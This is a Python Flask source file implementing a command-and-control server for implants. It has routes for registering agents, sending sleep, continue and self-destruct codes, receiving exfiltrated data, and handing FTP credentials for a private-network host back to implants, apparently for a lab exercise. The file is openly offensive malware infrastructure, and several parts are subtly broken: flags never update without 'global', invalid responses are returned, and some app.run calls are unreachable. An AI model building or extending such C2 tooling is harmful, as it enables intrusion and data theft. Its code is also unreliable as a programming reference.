from flask import Flask, request, make_response

app = Flask(__name__)

# Dictionary to hold agent sessions
agents = {}

# Manually triggered post requests
data_found = False
kill_implants = False

# Manual commands sent by user
## Manually send post to initialize self-destruct
@app.route('/manual_kill', methods=['POST'])
def self_destruct():
    data = request.json
    kill_implants = True
    return make_response(1)

## Manually send post to indicate that data is incorrect
@app.route('/manual_badData', methods=['POST'])
def cleared_data():
    data = request.json
    data_found = False
    return make_response(1)


# Route to register a new agent session
@app.route('/register', methods=['POST'])
def register():
    data = request.json
    agent_id = data['agent_id']
    command = data['command']
    agents[agent_id] = {'agent_id': agent_id,
                            'command' : command}
    return make_response({'cmd' : 1})

# Route to receive commands from an agent
@app.route('/command', methods=['POST'])
def command():
    # Send a command to a session
    data = request.json
    agent_id = data['agent_id']
    # Send the command to the agent associated with the session ID
    if agent_id in agents.keys():

        # Send the command to the agent here...
        # Can assign commands to numbers, i.e.,
        ## 0 - sleep
        ## 1 - continue
        ## 2 - self-destruct
        if data_found:
            response = make_response({'cmd' : 0})
            agents[agent_id] = 0
        elif kill_implants:
            response = make_response({'cmd' : 2})
            agents[agent_id] = 2
        else:
            response = make_response({ 'cmd' : 1})
            agents[agent_id] = 1
    
    return response

# Route to receive exfiltrated data from an agent
@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.json
    agent_id = data['agent_id']
    found = data['found']
    if agent_id in agents:
        if found == 1:
            data_found = True
            response = make_response({'host' : '192.168.68.128',
                                    'username' : 'ftpwebuser',
                                    'password' : 'password'})
            agents[agent_id] = 0
        else:
            response = make_response({'cmd' : 2})
            agents[agent_id] = 2

    return response

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)
    app.run(debug=True, host='0.0.0.0', port=20)
    app.run(debug=True, host='0.0.0.0', port=21)